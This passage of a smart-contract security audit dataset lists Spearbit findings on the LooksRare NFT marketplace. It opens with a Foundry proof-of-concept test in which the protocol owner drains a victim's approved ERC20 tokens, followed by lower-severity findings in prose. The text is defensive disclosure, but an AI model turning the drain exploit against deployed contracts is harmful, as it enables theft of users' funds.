its collection as the address of the targeted user and the assetType to the newly created assetType. The owner also creates the corresponding TakerBid by setting the recipient field to the amount of currency they would like to transfer. 3. Calls the executeTakerBid endpoint with the above data without a merkleTree or affiliate. // file: test/foundry/Attack.t.sol pragma solidity 0.8.17; import {IStrategyManager} from \"../../contracts/interfaces/IStrategyManager.sol\"; import {IBaseStrategy} from \"../../contracts/interfaces/IBaseStrategy.sol\"; import {OrderStructs} from \"../../contracts/libraries/OrderStructs.sol\"; import {ProtocolBase} from \"./ProtocolBase.t.sol\"; import {MockERC20} from \"../mock/MockERC20.sol\"; contract NullStrategy is IBaseStrategy { function isLooksRareV2Strategy() external pure override returns (bool) { return true; } function executeNull( OrderStructs.TakerBid calldata /* takerBid */ , OrderStructs.MakerAsk calldata /* makerAsk */ ) external pure returns ( uint256 price, uint256[] memory itemIds, uint256[] memory amounts, bool isNonceInvalidated ) {} } 5 contract AttackTest is ProtocolBase { NullStrategy private nullStrategy; MockERC20 private mockERC20; uint256 private signingOwnerPK = 42; address private signingOwner = vm.addr(signingOwnerPK); address private victimUser = address(505); function setUp() public override { super.setUp(); vm.startPrank(_owner); looksRareProtocol.initiateOwnershipTransfer(signingOwner); // This particular strategy is not a requirement of the exploit. nullStrategy = new NullStrategy(); looksRareProtocol.addStrategy( 0, 0, 0, NullStrategy.executeNull.selector, false, address(nullStrategy) ); mockERC20 = new MockERC20(); looksRareProtocol.updateCurrencyWhitelistStatus(address(mockERC20), true); looksRareProtocol.updateCreatorFeeManager(address(0)); mockERC20.mint(victimUser, 1000); vm.stopPrank(); vm.prank(signingOwner); looksRareProtocol.confirmOwnershipTransfer(); } function testDrain() public { vm.prank(victimUser); mockERC20.approve(address(looksRareProtocol), 1000); vm.startPrank(signingOwner); looksRareProtocol.addTransferManagerForAssetType( 2, address(mockERC20), mockERC20.transferFrom.selector ); OrderStructs.MakerAsk memory makerAsk = _createSingleItemMakerAskOrder({ // null strategy askNonce: 0, subsetNonce: 0, strategyId: 1, assetType: 2, // ERC20 asset! orderNonce: 0, collection: victimUser, // <--- will be used as the `from` currency: address(0), signer: signingOwner, minPrice: 0, itemId: 1 }); 6 bytes memory signature = _signMakerAsk(makerAsk, signingOwnerPK); OrderStructs.TakerBid memory takerBid = OrderStructs.TakerBid( address(1000), // `amount` field for the `transferFrom` 0, makerAsk.itemIds, makerAsk.amounts, bytes(\"\") ); looksRareProtocol.executeTakerBid( takerBid, makerAsk, signature, _EMPTY_MERKLE_TREE, _EMPTY_AFFILIATE ); vm.stopPrank(); assertEq(mockERC20.balanceOf(signingOwner), 1000); assertEq(mockERC20.balanceOf(victimUser), 0); } }", "labels": ["Spearbit", "LooksRare", "Severity: Critical Risk"]}, {"title": "StrategyFloorFromChainlink will often revert due to stale prices", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "The FloorFromChainlink strategy inherits from BaseStrategyChainlinkPriceLatency, so it can have a maxLatency of at most 3600 seconds. However, all of the chainlink mainnet floor price feeds have a heartbeat of 86400 seconds (24 hours), so the chainlink strategies will revert with the PriceNotRecentEnough error quite often. At the time of writing, every single mainnet floor price feed has an updateAt timestamp well over 3600 seconds in the past, meaning the strategy would always revert for any mainnet price feed right now. This may have not been realized earlier because the Goerli floor price feeds do have a heartbeat of 3600, but the mainnet heartbeat is much less frequent. One of the consequences is that users might miss out on exchanges they would have accepted. For example, if a taker bid is interested in a maker ask with an eth premium from the floor, in the likely scenario where the taker didn't log-in within 1 hour of the last oracle update, the strategy will revert and the exchange won't happen even though both parties are willing. If the floor moves up again the taker might not be interested anymore. The maker will have lost out on making a premium from the floor, and the taker would have lost out on the exchange they were willing to make.", "labels": ["Spearbit", "LooksRare", "Severity: Medium Risk"]}, {"title": "minPrice and maxPrice should reflect the allowed regions for the funds to be transferred from the bidder to the ask recipient", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "1. When a maker or taker sets a minPrice for an ask, the protocol should guarantee the funds they receive is at minimum the minPrice amount (currently not enforced). 2. Also reversely, when a maker or taker sets a maxPrice for a bid, the protocol should guarantee that the amount they spend is at maximum maxPrice (currently enforced). For 1. the current protocol-controlled deviation can be 30% maximum (sum of fees sent to the creator, the protocol fee recipient, and an affiliate).", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "StrategyItemIdsRange does not invalidate makerBid.amounts[0] == 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "StrategyItemIdsRange does not check whether makerBid.amounts[0] is zero or not. If it was 0, the taker can provide empty itemIds and amounts which will cause the for loop to be skipped. The check below will also be successful since both amounts are 0: if (totalOfferedAmount != desiredAmount) { revert OrderInvalid(); } Depending on the used implementation of a transfer manager for the asset type used in this order, we might end up with the taker taking funds from the maker without providing any NFT tokens. The current implementation of TransferManager does check whether the provided itemIds have length 0 and it would revert in that case. One difference between this strategy and others are that all strategies including this one do check to revert if an amount for a specific itemId is 0 (and some of them have loops but the length of those loops depends on the parameters from the maker which enforce the loop to run at least once), but for this strategy if no itemIds are provided by the taker, the loop is skipped and one does not check whether the aggregated amount is 0 or not.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "TransferManager's owner can block token transfers for LooksRareProtocol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "In general, a deployed TransferManager ( T ) and a deployed LooksRareProtocol ( L ) might have two different owners ( OT , OL ). Assume TransferManager is used for asset types 0 and 1 (ERC721, ERC1155) in LooksRareProtocol and Trans- ferManager has marked the LooksRareProtocol as an allowed operator. At any point, OT can call removeOpera- tor to block L from calling T . If that happens, OL would need to add new (virtual) asset types (not 0 or 1) and the corresponding transfer managers for them. Makers would need to resign their orders with new asset types. Moreover, if LooksRare for the following issue \"The Protocol owner can drain users' currency tokens\" applies their solution through PR 308 which removes the ability of OL to add new asset types, then the whole protocol would need to be redeployed, since all order executions would revert.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "transferItemsERC721 and transferBatchItemsAcrossCollections in TransferManager do not check whether an amount == 1 for an ERC721 token", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "transferItemsERC721 and transferBatchItemsAcrossCollections in TransferManager do not check whether an amount == 1 for an ERC721 token. If an operator (approved by a user) sends a 0 amount for an itemId in the context of transferring ERC721 token, TransferManager would perform those transfers, even though the logic in the operator might have meant to avoid those transfers.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "The maker cannot enforce the number of times a specific order can be fulfilled for custom strategies", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "When a maker signs an order with a specific strategy it leaves it up to the strategy to decide how many times this specific order can be fulfilled. The strategy's logic on how to decide on the returned isNonceIn- validated value, can be a complex logic in general that might be prone to errors (or have backdoors). The maker should be able to directly enforce at least an upper bound for the maximum number of fulfills for an order to avoid unexpected expenditure.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "A strategy can potentially reduce the value of a token before it gets transferred to a maker when a taker calls executeTakerAsk", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "When executeTakerAsk is called by a taker a (signed by maker) strategy will be called: (bool status, bytes memory data) = strategyInfo[makerBid.strategyId].implementation.call( abi.encodeWithSelector(strategyInfo[makerBid.strategyId].selector, takerAsk, makerBid) ); Note that this is a stateful call. This call is performed before the NFT token is transferred to the maker (signer). Even though the strategy is fixed by the maker (since the stratgeyId has been signed), the strategy's implementation might involve a complex logic that might allow (if the strategy colludes with the taker somehow) a derivative token (that is owned by / linked to the to-be-transferred token) to be reattached to another token (think of accessories for an NFT character token in a game). And so the value of the to-be-transferred token would be reduced in that sense. A maker would not be able to check for this linked derivative token ownership during the transaction since there is no post-transfer hook for the maker (except in one special case when the token involved is ERC1155 and the maker is a custom contract). Also, note that all the implemented strategies would not alter the state when they are called (their endpoints have a pure or a view visibility). There is an exception to this in the StrategyTestMultiFillCollectionOrder test contract.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "An added transfer manager cannot get deactivated from the protocol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Once a transfer manager for an asset type gets added to the protocol either through the constructor or through addTransferManagerForAssetType, if at some point there is a malicious behavior involved with the transfer manager, there is no mechanism for the protocol's owner to deactivate the transfer manager (similar to how strategies can be deactivated). If TransferManager is used for an asset type, on the TransferManager side the owner can break the link between the operator (the LooksRare protocol potentially) and the TransferManager but not the other way around.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "Temporary DoS is possible in case orders are using tokens with blacklists", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "In the process of settling orders, _transferFungibleTokens is being called at max 4 times. In case one of these calls fails the entire transaction fails. It can only fail when an ERC20 token is used for the trade but since contracts are whitelisted in the system and probably vetted by the team, it's safe to say it's less probable that the receiver will have the ability to revert the entire transaction, although it is possible for contracts that implement a transferAndCall pattern. However, there's still the issue of transactions being reverted due to blacklistings (which have become more popular in the last year). In order to better assess the risk let's elaborate more on the 4 potential recipients of a transaction: 1. affiliate - The risk can be easily mitigated by proper handling at the front-end level. If the transaction fails due to the affiliate's address, the taker can specify address(0) as the affiliate. 2. recipient - If the transaction fails due to the recipient's address, it can only impact the taker in a gas-griefing way. 3. protocol - If the transaction fails due to the protocol's address, its address might be updated by the contract owner in the worst case. 4. creator - If the transaction fails due to the creator's address it can not be changed directly, but in the worst case creatorFeeManager can be changed.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "viewCreatorFeeInfo's reversion depends on order of successful calls to collection.royaltyInfo", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "The outcome of the call to viewCreatorFeeInfo for both CreatorFeeManagerWithRebates and Cre- atorFeeManagerWithRoyalties is dependent on the order of itemIds. Assume, we have 2 itemIds with the following properties:  itemId x where the call to collection.royaltyInfo(x, price) is successful (status == 1) and returns (a, ...) where a 6= 0.  itemId y where the call to collection.royaltyInfo(y, price) fails (status == 0) Then if itemIds provided to viewCreatorFeeInfo is:  [x, y], the call to viewCreatorFeeInfo returns successfully as the outcome for y will be ignored/skipped.  [y, x], the call to viewCreatorFeeInfo reverts with BundleEIP2981NotAllowed(collection), since the first item will be skipped and so the initial value for creator will not be set and remains address(0), but when we process the loop for x, we end up comparing a with address(0) which causes the revert.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "CreatorFeeManagerWithRebates.viewCreatorFeeInfo reversion is dependent on the order of itemIds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Assume there is an itemId x where collection.royaltyInfo(x, price) returns (0, _) and an- other itemId y where collection.royaltyInfo(y, price) returns (a, _) where a 6= 0. the itemIds array provided to CreatorFeeManagerWithRebates.viewCreatorFeeInfo is [x, y, the call would revert with the return parameters would be (address(0), 0) and [y, x, ...], Then if ...], BundleEIP2981NotAllowed(collection).", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "Seller might get a lower fee than expected due to front-running", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "This protocol seems to have a fee structure where both the protocol and the original creator of the item are charging fees, and these fees are being subtracted from the seller's fee. This means that the seller, whether they are a maker or a taker, may receive a lower price than they expected due to sudden changes in creator or protocol fee rates.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "StrategyManager does not emit an event when the first strategy gets added.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "StrategyManager does not emit an event when the first strategy gets added which can cause issues for off-chain agents.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "TransferSelectorNFT does not emit events when new transfer managers are added in its construc- tor", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "TransferSelectorNFT does not emit an event when assetTypes of 0 and 1 are added in its con- structor.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "Protocol fees will be sent to address(0) if protocolFeeRecipient is not set.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Protocol fees will be sent to address(0) if protocolFeeRecipient is not set.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "The returned price by strategies are not validated", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "When a taker submits an order to be executed, the returned price by the maker's chosen strategy is not validated. The current strategies do have the validations implemented. But the general upper and lower bound price validation would need to be in the protocol contract itself since the price calculation in a potential strategy might be a complex matter that cannot be easily verified by a maker or a taker. Related issue: \"price validation in executeStrategyWithTakerAsk, executeCollectionStrategyWithTakerAsk and ex- ecuteCollectionStrategyWithTakerAskWithProof can be relaxed\"", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "Makers can sign (or be tricked into signing) collection of orders (using the merkle tree mechanism) that cannot be entirely canceled.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "All user-facing order execution endpoints of the protocol check whether the order hash is included in the merkle tree data provided by the caller. If it is, the maker/signer is only required to sign the hash of the tree's root. A maker might sign (or get tricked into signing) a root that belongs to trees with a high number of leaves such that the leaves each encode an order with  Different subsetNonce and orderNonce (this would require canceling each nonce individually if the relevant endpoints are used).  askNonce or bidNonce that form a consecutive array of intergers ( 1, (cid:1) (cid:1) (cid:1) , n ) (this would require incrementing these nonces at least n times, if this method was used as a way of canceling the orders). To cancel these orders, the maker would need to call the cancelOrderNonces, cancelSubsetNonces, or incre- mentBidAskNonces. If the tree has a high number of nodes, it might be infeasible to cancel all the orders due to gas costs. The maker would be forced to remove its token approvals (if it's not a custom EIP-1271 maker/signer) and not use that address again to interact with the protocol.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "The ItemIdsRange strategy allows for length mismatch in itemIds and amounts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "There is no validation that takerAsk.itemIds.length == takerAsk.amounts.length in the ItemIdsRange strategy, despite takerAsk.itemIds and takerAsk.amounts being the return values of the executeStrategyWithTakerAsk function. If takerAsk.itemIds.length > takerAsk.amounts.length, then the transaction will revert anyways when it attempts to read an index out of bounds in the main loop. However, there is nothing causing a revert if takerAsk.itemIds.length < takerAsk.amounts.length, and any extra values in the takerAsk.amounts array will be ignored. Most likely this issue would be caught later on in any transaction, e.g. the current TransferManager implementation checks for length mismatches. However, this TransferManager is just one possible implementation that could be added to the TransferSelectorNFT contract, so this still could be an issue.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "Spec mismatch - StrategyCollectionOffer allows the only single item orders where the spec states it should allow any amount", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Proof only allow the transfer of a single ERC721/ERC1155 item, although the specification states it should support any amount.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "Owner of strategies that inherit from BaseStrategyChainlinkMultiplePriceFeeds can add mali- cious price feeds after they have been added to LooksRareProtocol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Owner of strategies that inherit from BaseStrategyChainlinkMultiplePriceFeeds can add mali- cious price feeds for new collections after they have been added to LooksRareProtocol. It's also important to note that these strategy owners might not neccessarily be the same owner as the LooksRareProtocol's. 1. LooksRareProtocol's OL adds strategy S. 2. Stragey's owner OS adds a malicous price feed for a new collection T .", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "The price calculation in StrategyDutchAuction can be more accurate", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "StrategyDutchAuction calculates the auction price as uint256 duration = makerAsk.endTime - makerAsk.startTime; uint256 decayPerSecond = (startPrice - makerAsk.minPrice) / duration; uint256 elapsedTime = block.timestamp - makerAsk.startTime; price = startPrice - elapsedTime * decayPerSecond; One of the shortcomings of the above calculation is that division comes before multiplication which can amplify the error due to division.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "Incorrect isMakerBidValid logic in ItemIdsRange execution strategy", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "If an ItemIdsRange order has makerBid.itemIds[0] == 0, it is treated as invalid by the corre- sponding isMakerBidValid function. Since makerBid.itemIds[0] is the minItemId value, and since many NFT collections contain NFTs with id 0, this is incorrect (and does not match the logic of the ItemIdsRange executeS- trategyWithTakerAsk function). As a consequence, frontends that filter orders based on the isMakerBidValid function will ignore certain orders, even though they are valid.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "Restructure struct definitions in OrderStructs in a more optimized format", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Maker and taker ask and bid structs include the fields itemIds and amounts. For most strategies, these two arrays are supposed to have the same length (except for StrategyItemIdsRange). Even for Strate- gyItemIdsRange one can either:  Relax the requirement that makerBid.amounts.length == 1 (be replaced by amounts and itemIds length to be equal to 2 ) by allowing an unused extra amount or  not use the makerBid.amounts and makerBid.itemIds and instead grab those 3 parameters from the addi- tionalParameters field. This might actually make more sense since in the case of StrategyItemIdsRange, the itemIds and amounts carry information that deviates from what they are intended to be used for.", "labels": ["Spearbit", "LooksRare", "Severity: Gas Optimization"]}, {"title": "if/else block in executeMultipleTakerBids can be simplified/optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "if/else block in executeMultipleTakerBids can be simplified/optimized by using the continue keyword and placing the else's body in the outer scope. // If atomic, it uses the executeTakerBid function, if not atomic, it uses a catch/revert pattern with external function ,! if (isAtomic) { // Execute the transaction and add protocol fee totalProtocolFeeAmount += _executeTakerBid(takerBid, makerAsk, msg.sender, orderHash); unchecked { ++i; } continue; } try this.restrictedExecuteTakerBid(takerBid, makerAsk, msg.sender, orderHash) returns ( uint256 protocolFeeAmount ) { totalProtocolFeeAmount += protocolFeeAmount; } catch {} unchecked { ++i; } testThreeTakerBidsERC721OneFails() (gas: -24 (-0.002%)) Overall gas change: -24 (-0.002%) LooksRare: Fixed in PR 323. Spearbit: Verified.", "labels": ["Spearbit", "LooksRare", "Severity: Gas Optimization"]}, {"title": "Cache currency in executeTakerAsk and executeTakerBid", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "currency is read multiple times from calldata in executeTakerAsk and executeTakerBid.", "labels": ["Spearbit", "LooksRare", "Severity: Gas Optimization"]}, {"title": "Cache operators[i] in grantApprovals and revokeApprovals", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "operators[i] is used 3 times in grantApprovals's (and twice in revokeApprovals) for loop.", "labels": ["Spearbit", "LooksRare", "Severity: Gas Optimization"]}, {"title": "recipients[0] is never used", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "recipients[0] is set to protocolFeeRecipient. But its value is never used afterward. payProtocolFeeAndAffiliateFee, the fees[0] amount is manually distributed to an affiliate if any and the pro- tocolFeeRecipient.", "labels": ["Spearbit", "LooksRare", "Severity: Gas Optimization"]}, {"title": "currency validation can be optimized/refactored", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "In the context above we are enforcing only native tokens or WETH to be supplied. The if statement can be simplified and refactored into a utility function (possibly defined in either BaseStrategy or in BaseStrate- gyChainlinkPriceLatency): if (makerAsk.currency != address(0)) { if (makerAsk.currency != WETH) { revert WrongCurrency(); } }", "labels": ["Spearbit", "LooksRare", "Severity: Gas Optimization"]}, {"title": "validating amount can be simplified and possibly refactored", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "In the context above, we are trying to invalidate orders that have 0 amounts or an amount other than 1 when the asset if an ERC721 if (amount != 1) { if (amount == 0) { revert OrderInvalid(); } if (assetType == 0) { revert OrderInvalid(); } } The above snippet can be simplified into: if (amount == 0 or (amount != 1 and assetType == 0)) { revert OrderInvalid(); }", "labels": ["Spearbit", "LooksRare", "Severity: Gas Optimization"]}, {"title": "_verifyMatchingItemIdsAndAmountsAndPrice can be further optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "_verifyMatchingItemIdsAndAmountsAndPrice's validation logic uses more opcodes than is neces- sary. Also, the whole function can be turned into an assembly block to further optimized this function. Examples of simplifications for if conditions or(X, gt(Y, 0)) or(X, Y) // simplified version or(X, iszero(eq(Y,Z))) or(X, xor(Y, Z)) // simplified version The nested if block below if (amount != 1) { if (amount == 0) { revert OrderInvalid(); } if (assetType == 0) { revert OrderInvalid(); } } can be simplified into 33 if (amount == 0) { revert OrderInvalid(); } if ((amount != 1) && (assetType == 0)) { revert OrderInvalid(); }", "labels": ["Spearbit", "LooksRare", "Severity: Gas Optimization"]}, {"title": "In StrategyFloorFromChainlink premium amounts miss the related checks when compared to checks for discount amounts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "For discount amounts, StrategyFloorFromChainlink has custom checks for the underflows (even though they will be caught by the compiler): 36 if (floorPrice <= discountAmount) { revert DiscountGreaterThanFloorPrice(); } uint256 desiredPrice = floorPrice - discountAmount; ... // @dev Discount cannot be 100% if (discount >= 10_000) { revert OrderInvalid(); } uint256 desiredPrice = (floorPrice * (10_000 - discount)) / 10_000; Similar checks for overflows for the premium are missing in the execution and validation endpoints (even though they will be caught by the compiler, floorPrice + premium or 10_000 + premium might overflow).", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "StrategyFloorFromChainlink's isMakerBidValid compare the time dependent floorPrice to a fixed discount", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "When isMakerBidValid gets called depending on the market conditions at that specific time the comparisons between the floorPrice and the discount might cause this function to either return isValid as true or false.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "StrategyFloorFromChainlink's isMakerAskValid does not validate makerAsk.additionalParameters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "For executeFixedPremiumStrategyWithTakerBid and executeBasisPointsPremiumStrategy- WithTakerBid, maker needs to make sure to populate its additionalParameters with the premium amount, otherwise the taker's transactions would revert: makerAsk.additionalParameters = abi.encode(premium); isMakerAskValid does not check whether makerAsk.additionalParameters has 32 as its length. For example, the validation endpoint for StrategyCollectionOffer does check this for the merkle root.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "StrategyFloorFromChainlink strategies do not check for asset types explicitly", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "StrategyFloorFromChainlink has 4 different execution endpoints:  executeFixedPremiumStrategyWithTakerBid  executeBasisPointsPremiumStrategyWithTakerBid  executeFixedDiscountCollectionOfferStrategyWithTakerAsk  executeBasisPointsDiscountCollectionOfferStrategyWithTakerAsk All these endpoints require that only one amount to be passed (asked for or bid on) and that amount would need to be 1. This is in contrast to StrategyCollectionOffer strategy that allows an arbitrary amount (although also required to be only one amount, [a]) Currently, Chainlink only provides price feeds for a selected list of ERC721 collections: https://docs.chain.link/ data-feeds/nft-floor-price/addresses So, if there are no price feeds for ERC1155 (as of now), the transaction would revert. Thus implicitly one can deduce that the chainlink floor strategies are only implemented for ERC721 tokens. Other strategies condition the amounts based on the assetType: 38  assetType == 0 or ERC721 collections can only have 1 as a valid amount  assetType == 0 or ERC1155 collections can only have a non-zero number as a valid amount If in the future chainlink or another token-price-feed adds support for some ERC1155 collections, one cannot use the current floor strategies to fulfill an order with an amount greater than 1.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "itemIds and amounts are redundant fields for takerXxx struct", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Taker is the entity that initiates the calls to LooksRareProtocol's 3 order execution endpoints. Most implemented strategies (which are fixed/chosen by the maker through signing the makerXxx which includes the strategyId) require the itemIds and amounts fields for the maker and the taker to mirror each other. i : the j th element of maker's itemIds fields (the struct would be either MakerBid or MakerAsk depending  M j on the context)  M j a : the j th element of maker's amounts fields (the struct would be either MakerBid or MakerAsk depending on the context)  T j i : the j th element of taker's itemIds fields (the struct would be either TakerBid or TakerAsk depending on the context)  T j a : the j th element of taker's amounts fields (the struct would be either TakerBid or TakerAsk depending on the context) Borrowing notations also from:  \"Constraints among the number of item ids and amounts for taker or maker bids or asks are inconsistent among different strategies\"  IneheritedStategy : T j i = M j  StrategyDutchAuction : T j i , T j i = M j a = M j a i , T j a = M j a , taker can send extra itemIds and amounts but they won't be  StrategyUSDDynamicAsk : T j i = M j i , T j a = M j a , taker can send extra itemIds and amounts but they won't be used. used.  StrategyFloorFromChainlink.execute...PremiumStrategyWithTakerBid : T 0 i = M 0 i , T 0 a = M 0 a = 1 , taker can send extra itemIds and amounts but they won't be used.  StrategyFloorFromChainlink.execute...DiscountCollectionOfferStrategyWithTakerAsk : T 0 a = M 0 a = 1 , maker's itemIds are unused.  StrategyCollectionOffer : T 0 a = M 0 a , maker's itemIds are unused and taker's T i a for i > 0 are also unused.  StrategyItemIdsRange : M 0 i (cid:20) T j i (cid:20) M 1 i , P T j a = M 0 a . 39 For  IneheritedStategy  StrategyDutchAuction  StrategyUSDDynamicAsk  StrategyFloorFromChainlink.execute...PremiumStrategyWithTakerBid Shared taker's itemIds and amounts are redundant as they should exactly match maker's fields. For the other strategies, one can encode the required parameters in either maker's or taker's additionalParameters fields.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "discount == 10_000 is not allowed in executeBasisPointsDiscountCollectionOfferStrategyWith- TakerAsk", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "executeBasisPointsDiscountCollectionOfferStrategyWithTakerAsk reverts if discount == 10_000, but does not if discount == 99_99 which almost has the same effect. Note that if discount == 10_000, (forgetting about the revert) price = desiredPrice = 0. So, unless the taker (sender of the transaction) has set its takerAsk.minPrice to 0 (maker is bidding for a 100% discount and taker is gifting the NFT), the transaction would revert: if (takerAsk.minPrice > price) { // takerAsk.minPrice > 0 revert AskTooHigh(); }", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Restructure executeMultipleTakerBids's input parameters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "executeMultipleTakerBids has the following form function executeMultipleTakerBids( OrderStructs.TakerBid[] calldata takerBids, OrderStructs.MakerAsk[] calldata makerAsks, bytes[] calldata makerSignatures, OrderStructs.MerkleTree[] calldata merkleTrees, address affiliate, bool isAtomic ) For the input parameters provided, we need to make sure takerBids, makerAsks, makerSignatures, and merkle- Trees all have the same length. We can enforce this requirement by definition, if we restructure the input passed to executeMultipleTakerBids.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Restructure transferBatchItemsAcrossCollections input parameter format", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "transferBatchItemsAcrossCollections has the following form function transferBatchItemsAcrossCollections( address[] calldata collections, uint256[] calldata assetTypes, address from, address to, uint256[][] calldata itemIds, uint256[][] calldata amounts ) where collections, assetTypes, itemIds and amounts are supposed to have the same lengths. One can enforce that by redefining the input parameter and have this invariant enforced by definition.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "An approved operator can call transferBatchItemsAcrossCollections", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "TransferManager has 3 endpoints that an approved operator can call:  transferItemsERC721  transferItemsERC1155  transferBatchItemsAcrossCollections The first 2 share the same input parameter types but differ from transferBatchItemsAcrossCollections: , address transferItemsERC1155 address ,! address[], address[], address, address , uint256[][], uint256[][] // ,! transferBatchItemsAcrossCollections , address, uint256[], uint256[] // transferItemsERC721, 44 An operator like LooksRareProtocol might have an owner ( OL ) that can select/add arbitrary endpoint of this transfer manager for an asset type, but only call the transfer manager using the same input parameter types regardless of the added endpoint. So in this case, OL might add a new asset type with TransferManager.transferBatchItemsAcrossCollections.selector as the selector and this transfer manager as the manager. Now, since this operator/LooksRareProtocol (and possibly other future implementations of approved operators) uses the same list of parameters for all endpoints, when _transferNFT gets called, the transfer manager using the transferBatchItemsAcrossCollections endpoint but with the following encoded data: the protocol would call abi.encodeWithSelector( managerSelectorOfAssetType[assetType].selector, collection, sender, recipient, itemIds, amounts ) ) A crafty OL might try to take 